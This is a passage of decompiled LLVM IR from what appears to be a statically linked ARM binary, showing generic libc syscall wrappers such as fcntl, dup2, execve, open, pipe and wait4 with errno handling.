  %v6_11158 = load i32, i32* @r2, align 4
  %v1_11168 = add i32 %arg2, -12
  store i32 %v6_11158, i32* @r3, align 4
  %tmp = icmp ugt i32 %v1_11168, 2
  br i1 %tmp, label %dec_label_pc_11190, label %dec_label_pc_11188

dec_label_pc_11188:                               ; preds = %dec_label_pc_11158
  %v0_11188 = call i32 @function_111cc()
  br label %dec_label_pc_111bc

dec_label_pc_11190:                               ; preds = %dec_label_pc_11158
  %v2_11198 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_11198, i32* %r4.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_11198, -4095
  br i1 %tmp8, label %dec_label_pc_111bc, label %dec_label_pc_111a8

dec_label_pc_111a8:                               ; preds = %dec_label_pc_11190
  %v0_111a8 = call i32 @function_cec4()
  %v0_111ac = load i32, i32* %r4.global-to-local, align 4
  %v1_111ac = sub i32 0, %v0_111ac
  %v2_111b0 = inttoptr i32 %v0_111a8 to i32*
  store i32 %v1_111ac, i32* %v2_111b0, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_111bc

dec_label_pc_111bc:                               ; preds = %dec_label_pc_111a8, %dec_label_pc_11190, %dec_label_pc_11188
  %storemerge = phi i32 [ %v0_11188, %dec_label_pc_11188 ], [ %v2_11198, %dec_label_pc_11190 ], [ -1, %dec_label_pc_111a8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_11198, { 1, 0, 2 }
}

define i32 @function_111cc() local_unnamed_addr {
dec_label_pc_111cc:
  %r4.global-to-local = alloca i32, align 4
  %v0_111ec = load i32, i32* @r0, align 4
  store i32 %v0_111ec, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_111ec, -4095
  br i1 %tmp, label %dec_label_pc_11208, label %dec_label_pc_111f8

dec_label_pc_111f8:                               ; preds = %dec_label_pc_111cc
  %v0_111f8 = call i32 @function_cec4()
  %v0_111fc = load i32, i32* %r4.global-to-local, align 4
  %v1_111fc = sub i32 0, %v0_111fc
  %v2_11200 = inttoptr i32 %v0_111f8 to i32*
  store i32 %v1_111fc, i32* %v2_11200, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11208

dec_label_pc_11208:                               ; preds = %dec_label_pc_111cc, %dec_label_pc_111f8
  %v0_11208 = phi i32 [ %v0_111ec, %dec_label_pc_111cc ], [ -1, %dec_label_pc_111f8 ]
  ret i32 %v0_11208

; uselistorder directives
  uselistorder i32 %v0_111ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11208, { 1, 0 }
}

define i32 @function_1121c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1121c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1121c = load i32, i32* @r4, align 4
  store i32 %v3_1121c, i32* %stack_var_-8, align 4
  %v1_11220 = load i32, i32* @r1, align 4
  %v2_11220 = inttoptr i32 %v1_11220 to %sigaction*
  %v3_11220 = load i32, i32* @r2, align 4
  %v4_11220 = inttoptr i32 %v3_11220 to %sigaction*
  %v5_11220 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_11220, %sigaction* %v4_11220)
  store i32 %v5_11220, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_11220, -4095
  br i1 %tmp, label %dec_label_pc_11240, label %dec_label_pc_11230

dec_label_pc_11230:                               ; preds = %dec_label_pc_1121c
  %v0_11230 = call i32 @function_cec4()
  %v0_11234 = load i32, i32* %r4.global-to-local, align 4
  %v1_11234 = sub i32 0, %v0_11234
  %v2_11238 = inttoptr i32 %v0_11230 to i32*
  store i32 %v1_11234, i32* %v2_11238, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11240

dec_label_pc_11240:                               ; preds = %dec_label_pc_1121c, %dec_label_pc_11230
  %v0_11240 = phi i32 [ %v5_11220, %dec_label_pc_1121c ], [ -1, %dec_label_pc_11230 ]
  %v2_11244 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11244, i32* %r4.global-to-local, align 4
  ret i32 %v0_11240

; uselistorder directives
  uselistorder i32 %v5_11220, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11240, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_11248(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_11248:
  store i32 %arg1, i32* @r5, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_11270(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11270:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11270 = load i32, i32* @r4, align 4
  store i32 %v3_11270, i32* %stack_var_-8, align 4
  %v2_11274 = call i32 @dup2(i32 %arg1, i32 %arg2)
  store i32 %v2_11274, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_11274, -4095
  br i1 %tmp, label %dec_label_pc_11294, label %dec_label_pc_11284

dec_label_pc_11284:                               ; preds = %dec_label_pc_11270
  %v0_11284 = call i32 @function_cec4()
  %v0_11288 = load i32, i32* %r4.global-to-local, align 4
  %v1_11288 = sub i32 0, %v0_11288
  %v2_1128c = inttoptr i32 %v0_11284 to i32*
  store i32 %v1_11288, i32* %v2_1128c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11294

dec_label_pc_11294:                               ; preds = %dec_label_pc_11270, %dec_label_pc_11284
  %v0_11294 = phi i32 [ %v2_11274, %dec_label_pc_11270 ], [ -1, %dec_label_pc_11284 ]
  %v2_11298 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11298, i32* @r4, align 4
  ret i32 %v0_11294

; uselistorder directives
  uselistorder i32 %v2_11274, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11294, { 1, 0 }
}

define i32 @function_1129c() local_unnamed_addr {
dec_label_pc_1129c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1129c = load i32, i32* @r4, align 4
  store i32 %v3_1129c, i32* %stack_var_-8, align 4
  %v0_112a0 = load i32, i32* @r0, align 4
  %v1_112a0 = inttoptr i32 %v0_112a0 to i8*
  %v2_112a0 = load i32, i32* @r1, align 4
  %v3_112a0 = inttoptr i32 %v2_112a0 to i8*
  %v4_112a0 = insertvalue [1 x i8*] undef, i8* %v3_112a0, 0
  %v5_112a0 = load i32, i32* @r2, align 4
  %v6_112a0 = inttoptr i32 %v5_112a0 to i8*
  %v7_112a0 = insertvalue [1 x i8*] undef, i8* %v6_112a0, 0
  %v8_112a0 = call i32 @execve(i8* %v1_112a0, [1 x i8*] %v4_112a0, [1 x i8*] %v7_112a0)
  store i32 %v8_112a0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v8_112a0, -4095
  br i1 %tmp, label %dec_label_pc_112c0, label %dec_label_pc_112b0

dec_label_pc_112b0:                               ; preds = %dec_label_pc_1129c
  %v0_112b0 = call i32 @function_cec4()
  %v0_112b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_112b4 = sub i32 0, %v0_112b4
  %v2_112b8 = inttoptr i32 %v0_112b0 to i32*
  store i32 %v1_112b4, i32* %v2_112b8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_112c0

dec_label_pc_112c0:                               ; preds = %dec_label_pc_1129c, %dec_label_pc_112b0
  %v0_112c0 = phi i32 [ %v8_112a0, %dec_label_pc_1129c ], [ -1, %dec_label_pc_112b0 ]
  %v2_112c4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_112c4, i32* %r4.global-to-local, align 4
  ret i32 %v0_112c0

; uselistorder directives
  uselistorder i32 %v8_112a0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_112c0, { 1, 0 }
}

define i32 @function_112c8() local_unnamed_addr {
dec_label_pc_112c8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_112c8 = load i32, i32* @r4, align 4
  store i32 %v3_112c8, i32* %stack_var_-8, align 4
  %v0_112d0 = load i32, i32* @r0, align 4
  store i32 %v0_112d0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_112d0, -4095
  br i1 %tmp, label %dec_label_pc_112ec, label %dec_label_pc_112dc

dec_label_pc_112dc:                               ; preds = %dec_label_pc_112c8
  %v0_112dc = call i32 @function_cec4()
  %v0_112e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_112e0 = sub i32 0, %v0_112e0
  %v2_112e4 = inttoptr i32 %v0_112dc to i32*
  store i32 %v1_112e0, i32* %v2_112e4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_112f0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_112ec

dec_label_pc_112ec:                               ; preds = %dec_label_pc_112c8, %dec_label_pc_112dc
  %v2_112f0 = phi i32 [ %v3_112c8, %dec_label_pc_112c8 ], [ %v2_112f0.pre, %dec_label_pc_112dc ]
  %v0_112ec = phi i32 [ %v0_112d0, %dec_label_pc_112c8 ], [ -1, %dec_label_pc_112dc ]
  store i32 %v2_112f0, i32* @r4, align 4
  ret i32 %v0_112ec

; uselistorder directives
  uselistorder i32 %v0_112d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_112ec, { 1, 0 }
}

define i32 @function_112f4() local_unnamed_addr {
dec_label_pc_112f4:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_112f4 = load i32, i32* @r4, align 4
  store i32 %v3_112f4, i32* %stack_var_-8, align 4
  %v0_112fc = load i32, i32* @r0, align 4
  store i32 %v0_112fc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_112fc, -4095
  br i1 %tmp, label %dec_label_pc_11318, label %dec_label_pc_11308

dec_label_pc_11308:                               ; preds = %dec_label_pc_112f4
  %v0_11308 = call i32 @function_cec4()
  %v0_1130c = load i32, i32* %r4.global-to-local, align 4
  %v1_1130c = sub i32 0, %v0_1130c
  %v2_11310 = inttoptr i32 %v0_11308 to i32*
  store i32 %v1_1130c, i32* %v2_11310, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1131c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11318

dec_label_pc_11318:                               ; preds = %dec_label_pc_112f4, %dec_label_pc_11308
  %v2_1131c = phi i32 [ %v3_112f4, %dec_label_pc_112f4 ], [ %v2_1131c.pre, %dec_label_pc_11308 ]
  %v0_11318 = phi i32 [ %v0_112fc, %dec_label_pc_112f4 ], [ -1, %dec_label_pc_11308 ]
  store i32 %v2_1131c, i32* @r4, align 4
  ret i32 %v0_11318

; uselistorder directives
  uselistorder i32 %v0_112fc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11318, { 1, 0 }
}

define i32 @function_11320(i32 %arg1) local_unnamed_addr {
dec_label_pc_11320:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11320 = load i32, i32* @r4, align 4
  store i32 %v3_11320, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_11344, label %dec_label_pc_11334

dec_label_pc_11334:                               ; preds = %dec_label_pc_11320
  %v0_11334 = call i32 @function_cec4()
  %v0_11338 = load i32, i32* %r4.global-to-local, align 4
  %v1_11338 = sub i32 0, %v0_11338
  %v2_1133c = inttoptr i32 %v0_11334 to i32*
  store i32 %v1_11338, i32* %v2_1133c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_11348.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11344

dec_label_pc_11344:                               ; preds = %dec_label_pc_11320, %dec_label_pc_11334
  %v2_11348 = phi i32 [ %v3_11320, %dec_label_pc_11320 ], [ %v2_11348.pre, %dec_label_pc_11334 ]
  %v0_11344 = phi i32 [ %arg1, %dec_label_pc_11320 ], [ -1, %dec_label_pc_11334 ]
  store i32 %v2_11348, i32* %r4.global-to-local, align 4
  ret i32 %v0_11344

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11344, { 1, 0 }
}

define i32 @function_1134c() local_unnamed_addr {
dec_label_pc_1134c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1134c = load i32, i32* @r4, align 4
  store i32 %v3_1134c, i32* %stack_var_-8, align 4
  %v0_11354 = load i32, i32* @r0, align 4
  store i32 %v0_11354, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11354, -4095
  br i1 %tmp, label %dec_label_pc_11370, label %dec_label_pc_11360

dec_label_pc_11360:                               ; preds = %dec_label_pc_1134c
  %v0_11360 = call i32 @function_cec4()
  %v0_11364 = load i32, i32* %r4.global-to-local, align 4
  %v1_11364 = sub i32 0, %v0_11364
  %v2_11368 = inttoptr i32 %v0_11360 to i32*
  store i32 %v1_11364, i32* %v2_11368, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_11374.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_11370

dec_label_pc_11370:                               ; preds = %dec_label_pc_1134c, %dec_label_pc_11360
  %v2_11374 = phi i32 [ %v3_1134c, %dec_label_pc_1134c ], [ %v2_11374.pre, %dec_label_pc_11360 ]
  %v0_11370 = phi i32 [ %v0_11354, %dec_label_pc_1134c ], [ -1, %dec_label_pc_11360 ]
  store i32 %v2_11374, i32* %r4.global-to-local, align 4
  ret i32 %v0_11370

; uselistorder directives
  uselistorder i32 %v0_11354, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11370, { 1, 0 }
}

define i32 @function_11378(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11378:
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to %timespec*
  %stack_var_-8 = alloca i32, align 4
  %v3_11378 = load i32, i32* @r4, align 4
  store i32 %v3_11378, i32* %stack_var_-8, align 4
  %v6_1137c = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp)
  store i32 %v6_1137c, i32* %r4.global-to-local, align 4
  %tmp6 = icmp ult i32 %v6_1137c, -4095
  br i1 %tmp6, label %dec_label_pc_1139c, label %dec_label_pc_1138c

dec_label_pc_1138c:                               ; preds = %dec_label_pc_11378
  %v0_1138c = call i32 @function_cec4()
  %v0_11390 = load i32, i32* %r4.global-to-local, align 4
  %v1_11390 = sub i32 0, %v0_11390
  %v2_11394 = inttoptr i32 %v0_1138c to i32*
  store i32 %v1_11390, i32* %v2_11394, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1139c

dec_label_pc_1139c:                               ; preds = %dec_label_pc_11378, %dec_label_pc_1138c
  %v0_1139c = phi i32 [ %v6_1137c, %dec_label_pc_11378 ], [ -1, %dec_label_pc_1138c ]
  %v2_113a0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_113a0, i32* %r4.global-to-local, align 4
  ret i32 %v0_1139c

; uselistorder directives
  uselistorder i32 %v6_1137c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1139c, { 1, 0 }
}

define i32 @function_113a4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_113a4:
  %r4.global-to-local = alloca i32, align 4
  %v1_113b4 = and i32 %arg2, 64
  %v2_113b4 = icmp eq i32 %v1_113b4, 0
  br i1 %v2_113b4, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_113a4
  %v6_113a4 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_113a4, 65536
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_113a4, %bb
  %v0_113c4 = phi i32 [ 0, %dec_label_pc_113a4 ], [ %phitmp, %bb ]
  store i32 %v0_113c4, i32* @r2, align 4
  %v4_113cc = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_113d0 = icmp eq i32 %v4_113cc, -4096
  store i1 %v7_113d0, i1* @cpsr_z, align 1
  store i32 %v4_113cc, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_113cc, -4095
  br i1 %tmp, label %dec_label_pc_113ec, label %dec_label_pc_113dc

dec_label_pc_113dc:                               ; preds = %.thread1
  %v0_113dc = call i32 @function_cec4()
  %v0_113e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_113e0 = sub i32 0, %v0_113e0
  %v2_113e4 = inttoptr i32 %v0_113dc to i32*
  store i32 %v1_113e0, i32* %v2_113e4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_113ec

dec_label_pc_113ec:                               ; preds = %.thread1, %dec_label_pc_113dc
  %v0_113ec = phi i32 [ %v4_113cc, %.thread1 ], [ -1, %dec_label_pc_113dc ]
  ret i32 %v0_113ec

; uselistorder directives
  uselistorder i32 %v4_113cc, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_113ec, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_11400(i32 %arg1) local_unnamed_addr {
dec_label_pc_11400:
  store i32 %arg1, i32* @r2, align 4
  %v0_11408 = load i32, i32* @r0, align 4
  %v2_11408 = inttoptr i32 %v0_11408 to i8*
  %v3_11408 = call i32 @function_113a4(i8* %v2_11408, i32 577)
  %v0_1140c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1140c, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_11400
  %v6_1140c = and i32 %v3_11408, 36
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_11400, %bb
  %v7_1140c = phi i32 [ %v3_11408, %dec_label_pc_11400 ], [ %v6_1140c, %bb ]
  ret i32 %v7_1140c

; uselistorder directives
  uselistorder i32 (i8*, i32)* @function_113a4, { 0, 2, 1 }
  uselistorder i32 577, { 1, 0, 2 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_11410(i32 %arg1) local_unnamed_addr {
dec_label_pc_11410:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11410 = load i32, i32* @r4, align 4
  store i32 %v3_11410, i32* %stack_var_-8, align 4
  %v1_11414 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_11414 = call i32 @pipe([2 x i32] %v1_11414)
  store i32 %v2_11414, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v2_11414, -4095
  br i1 %tmp, label %dec_label_pc_11434, label %dec_label_pc_11424

dec_label_pc_11424:                               ; preds = %dec_label_pc_11410
  %v0_11424 = call i32 @function_cec4()
  %v0_11428 = load i32, i32* %r4.global-to-local, align 4
  %v1_11428 = sub i32 0, %v0_11428
  %v2_1142c = inttoptr i32 %v0_11424 to i32*
  store i32 %v1_11428, i32* %v2_1142c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11434

dec_label_pc_11434:                               ; preds = %dec_label_pc_11410, %dec_label_pc_11424
  %v0_11434 = phi i32 [ %v2_11414, %dec_label_pc_11410 ], [ -1, %dec_label_pc_11424 ]
  %v2_11438 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11438, i32* @r4, align 4
  ret i32 %v0_11434

; uselistorder directives
  uselistorder i32 %v2_11414, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11434, { 1, 0 }
}

define i32 @function_1143c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1143c:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1143c = load i32, i32* @r4, align 4
  store i32 %v3_1143c, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_1aaec.542 to i32), i32* %r4.global-to-local, align 4
  %v2_11444 = load i32, i32* @global_var_1aaec.542, align 4
  %v2_11448 = icmp eq i32 %v2_11444, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_11448, label %dec_label_pc_11458, label %dec_label_pc_11464

dec_label_pc_11458:                               ; preds = %dec_label_pc_1143c
  %v2_11458 = call i32 @function_1374c(i32* null)
  %v1_1145c = icmp slt i32 %v2_11458, 0
  br i1 %v1_1145c, label %dec_label_pc_11484, label %dec_label_pc_11464thread-pre-split

dec_label_pc_11464thread-pre-split:               ; preds = %dec_label_pc_11458
  %v0_11468.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_11464.pre = load i32, i32* @global_var_1aaec.542, align 4
  br label %dec_label_pc_11464

dec_label_pc_11464:                               ; preds = %dec_label_pc_11464thread-pre-split, %dec_label_pc_1143c
  %v2_11464 = phi i32 [ %v2_11464.pre, %dec_label_pc_11464thread-pre-split ], [ %v2_11444, %dec_label_pc_1143c ]
  %v1_11470 = phi i32 [ %v0_11468.pr, %dec_label_pc_11464thread-pre-split ], [ %arg1, %dec_label_pc_1143c ]
  %v2_11468 = icmp eq i32 %v1_11470, 0
  store i32 %v2_11464, i32* %r4.global-to-local, align 4
  br i1 %v2_11468, label %dec_label_pc_11488, label %dec_label_pc_11478

dec_label_pc_11478:                               ; preds = %dec_label_pc_11464
  %v2_11470 = add i32 %v1_11470, %v2_11464
  %v1_11478 = inttoptr i32 %v2_11470 to i32*
  %v2_11478 = call i32 @function_1374c(i32* %v1_11478)
  %v1_1147c = icmp slt i32 %v2_11478, 0
  br i1 %v1_1147c, label %dec_label_pc_11484, label %dec_label_pc_11478.dec_label_pc_11488_crit_edge

dec_label_pc_11478.dec_label_pc_11488_crit_edge:  ; preds = %dec_label_pc_11478
  %v0_11488.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11488

dec_label_pc_11484:                               ; preds = %dec_label_pc_11478, %dec_label_pc_11458
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11488

dec_label_pc_11488:                               ; preds = %dec_label_pc_11478.dec_label_pc_11488_crit_edge, %dec_label_pc_11464, %dec_label_pc_11484
  %v0_11488 = phi i32 [ %v0_11488.pre, %dec_label_pc_11478.dec_label_pc_11488_crit_edge ], [ %v2_11464, %dec_label_pc_11464 ], [ -1, %dec_label_pc_11484 ]
  %v2_1148c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1148c, i32* @r4, align 4
  ret i32 %v0_11488

; uselistorder directives
  uselistorder i32 %v2_11464, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder label %dec_label_pc_11488, { 2, 0, 1 }
}

define i32 @function_11494(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11494:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11494 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_11494, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11494
  %v3_1149c5 = load i32, i32* @r4, align 4
  store i32 %v3_1149c5, i32* %stack_var_-8, align 4
  br label %dec_label_pc_114bc

bb:                                               ; preds = %dec_label_pc_11494
  %v3_1149c = load i32, i32* @r4, align 4
  store i32 %v3_1149c, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_114bc, label %dec_label_pc_114a8

dec_label_pc_114a8:                               ; preds = %bb
  %v0_114a8 = call i32 @function_cec4()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_114b4 = inttoptr i32 %v0_114a8 to i32*
  store i32 22, i32* %v2_114b4, align 4
  %v0_114e0.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_114e0

dec_label_pc_114bc:                               ; preds = %.thread, %bb
  %v7_114bc = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_114bc, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_114bc, -4095
  br i1 %tmp13, label %dec_label_pc_114dc, label %dec_label_pc_114cc

dec_label_pc_114cc:                               ; preds = %dec_label_pc_114bc
  %v0_114cc = call i32 @function_cec4()
  %v0_114d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_114d0 = sub i32 0, %v0_114d0
  %v2_114d4 = inttoptr i32 %v0_114cc to i32*
  store i32 %v1_114d0, i32* %v2_114d4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_114dc

dec_label_pc_114dc:                               ; preds = %dec_label_pc_114bc, %dec_label_pc_114cc
  %v0_114dc = phi i32 [ %v7_114bc, %dec_label_pc_114bc ], [ -1, %dec_label_pc_114cc ]
  store i32 %v0_114dc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_114e0

dec_label_pc_114e0:                               ; preds = %dec_label_pc_114a8, %dec_label_pc_114dc
  %v0_114e0 = phi i32 [ %v0_114e0.pre, %dec_label_pc_114a8 ], [ %v0_114dc, %dec_label_pc_114dc ]
  %v2_114e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_114e4, i32* @r4, align 4
  ret i32 %v0_114e0

; uselistorder directives
  uselistorder i32 %v7_114bc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_114e0, { 1, 0 }
  uselistorder label %dec_label_pc_114dc, { 1, 0 }
  uselistorder label %dec_label_pc_114bc, { 1, 0 }
}

define i32 @function_114e8() local_unnamed_addr {
dec_label_pc_114e8:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_114e8 = load i32, i32* @r4, align 4
  store i32 %v3_114e8, i32* %stack_var_-8, align 4
  %v0_114ec = load i32, i32* @r0, align 4
  %v1_114ec = load i32, i32* @r1, align 4
  %v2_114ec = load i32, i32* @r2, align 4
  %v3_114ec = load i32, i32* @r3, align 4
  %v4_114ec = inttoptr i32 %v3_114ec to %rusage*
  %v5_114ec = call i32 @wait4(i32 %v0_114ec, i32 %v1_114ec, i32 %v2_114ec, %rusage* %v4_114ec)
  store i32 %v5_114ec, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_114ec, -4095
  br i1 %tmp, label %dec_label_pc_1150c, label %dec_label_pc_114fc

dec_label_pc_114fc:                               ; preds = %dec_label_pc_114e8
  %v0_114fc = call i32 @function_cec4()
  %v0_11500 = load i32, i32* %r4.global-to-local, align 4
  %v1_11500 = sub i32 0, %v0_11500
  %v2_11504 = inttoptr i32 %v0_114fc to i32*
  store i32 %v1_11500, i32* %v2_11504, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1150c

dec_label_pc_1150c:                               ; preds = %dec_label_pc_114e8, %dec_label_pc_114fc
  %v0_1150c = phi i32 [ %v5_114ec, %dec_label_pc_114e8 ], [ -1, %dec_label_pc_114fc ]
  %v2_11510 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11510, i32* @r4, align 4
  ret i32 %v0_1150c

; uselistorder directives
  uselistorder i32 %v5_114ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1150c, { 1, 0 }
}

define i32 @function_11514() local_unnamed_addr {
dec_label_pc_11514:
  ret i32 ptrtoint (i32* @global_var_1aacc.544 to i32)
}

define i32 @function_11520(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11520:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_11524 = icmp eq i32 %arg1, 0
  br i1 %v2_11524, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_11520
  br label %bb11

bb:                                               ; preds = %dec_label_pc_11520
  %v3_1152c = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_11554 = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_11548 = phi i32 [ %arg1, %.thread ], [ %v3_1152c, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_11540 = ptrtoint i32* %stack_var_-16 to i32
  %v2_1154c = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_1154c, i32* %stack_var_-16, align 4
  store i32 %v0_11554, i32* %stack_var_-12, align 4
  %v5_1155c = inttoptr i32 %v0_11548 to i8*
  %v6_1155c = call i32 @function_11590(i8* %v5_1155c, i32 %v2_11540, i32 1, i32 16, i32 %arg3)
  %v2_11560 = icmp eq i32 %v6_1155c, 0
  br i1 %v2_11560, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_1156c = phi i32 [ %v6_1155c, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_1156c

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_11570() local_unnamed_addr {
dec_label_pc_11570:
  %v0_1157c = load i32, i32* @r2, align 4
  store i32 %v0_1157c, i32* @r3, align 4
  %v0_11584 = load i32, i32* @r0, align 4
  %v1_11584 = load i32, i32* @r1, align 4
  %v5_11584 = inttoptr i32 %v0_11584 to i8*
